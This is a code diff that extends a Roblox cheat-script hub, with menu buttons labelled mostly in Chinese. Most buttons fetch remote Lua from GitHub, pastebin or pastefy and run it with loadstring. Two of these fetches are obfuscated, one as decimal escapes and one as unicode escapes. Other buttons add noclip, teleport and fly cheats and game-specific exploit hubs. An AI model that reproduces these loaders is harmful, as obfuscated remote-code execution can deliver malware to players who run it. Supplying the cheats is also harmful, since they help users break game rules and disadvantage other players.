@@ -22,6 +22,8 @@ local Tab1 = Window:CreateTab("关于")
 local Tab2 = Window:CreateTab("通用")
 local Tab3 = Window:CreateTab("ohio")
 local Tab4 = Window:CreateTab("娱乐")
+local Tab5 = Window:CreateTab("doors")
+local Tab6 = Window:CreateTab("墨水游戏")
 
 -- 1. 切换开关(Toggle)示例
 local ToggleExample = Tab1:CreateToggle({
@@ -147,10 +149,114 @@ local ButtonExample = Tab2:CreateButton({
 
 
 local ButtonExample = Tab2:CreateButton({
+    Name = "iy",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
+    Name = "DX夜",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/test-lol/main/YO.lua"))()
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
+    Name = "鼠标",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet(('https://pastefy.ga/V75mqzaz/raw'),true))()
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
+    Name = "键盘",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
+    Name = "画质",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
     Name = "传送",
     Callback = function()
         print("按钮被点击了!")
         mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE] TELEPORT TOOL" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
+    Name = "召唤假人脚本标记点",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiqiqezbro/-/main/suj", true))()
+    end,
+})
+
+
+local ButtonExample = Tab2:CreateButton({
+    Name = "Fill",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+    end,
+})
+
+
+local ToggleExample = Tab2:CreateToggle({
+    Name = "穿墙",
+    CurrentValue = false,
+    Flag = "ToggleExample",
+    Callback = function(Value)
+        print("切换开关状态:", Value)
+        		if Value then
+		    Noclip = true
+		    Stepped = game.RunService.Stepped:Connect(function()
+			    if Noclip == true then
+				    for a, b in pairs(game.Workspace:GetChildren()) do
+                        if b.Name == game.Players.LocalPlayer.Name then
+                            for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
+                                if v:IsA("BasePart") then
+                                    v.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+			    else
+				    Stepped:Disconnect()
+			    end
+		    end)
+	    else
+		    Noclip = false
+	    end
+    end
+})
+
+
+local TextBoxExample = Tab2:CreateInput({
+    Name = "输入框示例",
+    PlaceholderText = "输入一些文字...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Text)
+        print("输入的文本:", Text)
+        
     end,
 })
 
@@ -164,6 +270,15 @@ local ButtonExample = Tab3:CreateButton({
 })
 
 
+local ButtonExample = Tab3:CreateButton({
+    Name = "fly",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxluau/Roblox/main/ScriptHub.lua"))()
+    end,
+})
+
+
 local ButtonExample = Tab4:CreateButton({
     Name = "奔跑脚本",
     Callback = function()
@@ -173,4 +288,46 @@ local ButtonExample = Tab4:CreateButton({
 })
 
 
+local ButtonExample = Tab5:CreateButton({
+    Name = "ms doors",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet(("https://raw.githubusercontent.com/mstudio45/poopdoors_edited/main/poopdoors_edited.lua"),true))()
+    end,
+})
 
+
+local ButtonExample = Tab5:CreateButton({
+    Name = "微doors",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\117\72\72\112\56\102\122\83"))()
+    end,
+})
+
+
+local ButtonExample = Tab6:CreateButton({
+    Name = "TX",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring("\u{006c}\u{006f}\u{0061}\u{0064}\u{0073}\u{0074}\u{0072}\u{0069}\u{006e}\u{0067}\u{0028}\u{0067}\u{0061}\u{006d}\u{0065}\u{003a}\u{0048}\u{0074}\u{0074}\u{0070}\u{0047}\u{0065}\u{0074}\u{0028}\u{0022}\u{0068}\u{0074}\u{0074}\u{0070}\u{0073}\u{003a}\u{002f}\u{002f}\u{0072}\u{0061}\u{0077}\u{002e}\u{0067}\u{0069}\u{0074}\u{0068}\u{0075}\u{0062}\u{0075}\u{0073}\u{0065}\u{0072}\u{0063}\u{006f}\u{006e}\u{0074}\u{0065}\u{006e}\u{0074}\u{002e}\u{0063}\u{006f}\u{006d}\u{002f}\u{004a}\u{0073}\u{0059}\u{0062}\u{0036}\u{0036}\u{0036}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{005f}\u{0071}\u{0075}\u{006e}\u{002d}\u{0038}\u{0030}\u{0039}\u{0037}\u{0037}\u{0031}\u{0031}\u{0034}\u{0031}\u{002f}\u{0072}\u{0065}\u{0066}\u{0073}\u{002f}\u{0068}\u{0065}\u{0061}\u{0064}\u{0073}\u{002f}\u{0054}\u{0055}\u{0049}\u{0058}\u{0055}\u{0049}\u{002f}\u{004d}\u{0053}\u{0059}\u{0058}\u{0022}\u{0029}\u{0029}\u{0028}\u{0029}")()
+    end,
+})
+
+
+local ButtonExample = Tab6:CreateButton({
+    Name = "texrblix",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/TexRBLlX"))()
+    end,
+})
+
+
+local ButtonExample = Tab6:CreateButton({
+    Name = "不到",
+    Callback = function()
+        print("按钮被点击了!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterVaz/InkGameAzure/main/Protected_7974105512464815.lua.txt"))()
+    end,
+})
